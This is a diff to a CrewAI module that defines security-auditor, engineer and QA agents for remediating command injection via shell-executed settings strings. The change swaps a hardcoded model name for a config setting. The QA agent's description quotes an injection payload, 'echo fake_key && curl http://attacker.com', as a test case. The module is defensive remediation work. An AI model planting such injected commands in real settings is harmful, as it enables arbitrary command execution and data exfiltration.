@@ -7,6 +7,10 @@ Agents are imported by vuln03_crew.py to keep each module under the
 
 from crewai import Agent
 
+from .config import settings
+
+_LLM = settings.crew_llm_model
+
 security_auditor = Agent(
     role="Security_Auditor",
     goal=(
@@ -19,7 +23,7 @@ security_auditor = Agent(
         "Injection). Specialises in finding cases where untrusted "
         ".claude/settings.json helper strings are executed via shell:true."
     ),
-    llm="anthropic/claude-haiku-4-5-20251001",
+    llm=_LLM,
     memory=False,
     allow_delegation=False,
     verbose=True,
@@ -38,7 +42,7 @@ implementation_engineer = Agent(
         "to shell:false argv-array spawns, and writing strict PreToolUse "
         "Agent Hooks to sanitize input before any command runs."
     ),
-    llm="anthropic/claude-haiku-4-5-20251001",
+    llm=_LLM,
     memory=False,
     allow_delegation=False,
     verbose=True,
@@ -56,7 +60,7 @@ qa_verifier = Agent(
         "'echo fake_key && curl http://attacker.com' are successfully blocked "
         "by the newly implemented PreToolUse hook and spawn refactoring."
     ),
-    llm="anthropic/claude-haiku-4-5-20251001",
+    llm=_LLM,
     memory=False,
     allow_delegation=False,
     verbose=True,
